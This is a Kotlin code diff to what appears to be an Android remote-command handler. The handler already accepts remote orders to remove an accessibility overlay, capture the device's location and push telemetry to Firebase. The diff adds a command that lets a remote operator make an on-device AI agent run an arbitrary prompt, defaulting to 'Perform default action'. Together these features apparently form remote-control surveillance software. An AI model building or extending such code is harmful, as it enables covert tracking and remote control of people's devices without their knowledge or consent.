@@ -145,6 +145,12 @@ class RemoteCommandManager(private val context: Context) {
                     com.example.service.AccessibilityOverlayManager.removeOverlay(context)
                     resultMessage = "Accessibility overlay removed remotely."
                 }
+                "AI_PROMPT", "AI_COMMAND", "PROMPT", "ASK_AI" -> {
+                    val promptText = payload.ifEmpty { "Perform default action" }
+                    resultMessage = kotlinx.coroutines.runBlocking {
+                        AiAgentManager(context).processAiPrompt(promptText)
+                    }
+                }
                 "SYNC_LOCATION", "LOCATION", "GET_LOCATION" -> {
                     val loc = LocationSyncManager(context).captureAndSyncLocation()
                     FirebaseSyncEngine(context).pushTelemetryToFirebase()
